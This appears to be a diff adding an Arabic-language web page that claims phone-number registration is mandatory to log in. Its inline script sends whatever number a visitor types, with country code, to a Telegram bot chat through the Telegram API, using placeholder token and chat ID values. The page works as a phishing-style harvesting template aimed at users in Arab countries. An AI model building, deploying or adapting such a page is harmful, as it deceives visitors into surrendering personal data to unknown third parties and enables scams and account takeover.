@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل إجباري من خلال رقم هاتفك</title>
+    <link rel="stylesheet" href="style.css"> <!-- ربط ملف الـ CSS -->
+    <script>
+        function sendToTelegram() {
+            var number = document.getElementById("number").value;
+            var countryCode = document.getElementById("countryCode").value;
+
+            if (number.trim() === "") {
+                alert("الرجاء إدخال الرقم");
+                return;
+            }
+
+            var regex = /^[0-9]+$/;
+            if (!regex.test(number)) {
+                alert("الرجاء إدخال رقم صحيح فقط.");
+                return;
+            }
+
+            var fullNumber = countryCode + number;
+            var token = 'YOUR_BOT_TOKEN';
+            var chatId = 'YOUR_CHAT_ID';
+
+            var message = "الرقم المرسل: " + fullNumber;
+
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("تم إرسال الرقم بنجاح إلى تلغرام!");
+                    } else {
+                        alert("حدث خطأ أثناء إرسال الرسالة.");
+                    }
+                })
+                .catch(error => {
+                    console.error("خطأ في إرسال الطلب: ", error);
+                    alert("حدث خطأ في إرسال الرسالة.");
+                });
+        }
+    </script>
+</head>
+<body>
+    <header>
+        <img src="images/logo.png" alt="شعار الموقع" class="logo"> <!-- إضافة الشعار -->
+    </header>
+    <main>
+        <h2>تسجيل إجباري من خلال رقم هاتفك</h2>
+        <p>الرجاء إدخال رقم هاتفك مع رمز الدولة لتسجيل الدخول</p>
+        <form onsubmit="event.preventDefault(); sendToTelegram();">
+            <label for="countryCode">اختر رمز الدولة:</label>
+            <select id="countryCode" required>
+                <option value="+20">مصر (+20)</option>
+                <option value="+971">الإمارات (+971)</option>
+                <option value="+966">السعودية (+966)</option>
+                <option value="+962">الأردن (+962)</option>
+                <option value="+965">الكويت (+965)</option>
+                <option value="+974">قطر (+974)</option>
+                <option value="+968">عمان (+968)</option>
+                <option value="+973">البحرين (+973)</option>
+                <option value="+212">المغرب (+212)</option>
+                <option value="+213">الجزائر (+213)</option>
+                <option value="+218">ليبيا (+218)</option>
+                <option value="+249">السودان (+249)</option>
+                <option value="+964">العراق (+964)</option>
+                <option value="+961">لبنان (+961)</option>
+                <option value="+963">سوريا (+963)</option>
+                <option value="+972">فلسطين (+972)</option>
+                <option value="+967">اليمن (+967)</option>
+                <option value="+216">تونس (+216)</option>
+                <option value="+253">جيبوتي (+253)</option>
+            </select>
+            <br><br>
+            <label for="number">الرجاء إدخال رقم الهاتف:</label>
+            <input type="text" id="number" name="number" required placeholder="أدخل رقم الهاتف هنا فقط" pattern="[0-9]+" title="يرجى إدخال رقم مكون من أرقام فقط">
+            <button type="submit">إرسال</button>
+        </form>
+    </main>
+    <footer>
+        <p>© 2024 جميع الحقوق محفوظة</p>
+    </footer>
+</body>
+</html>
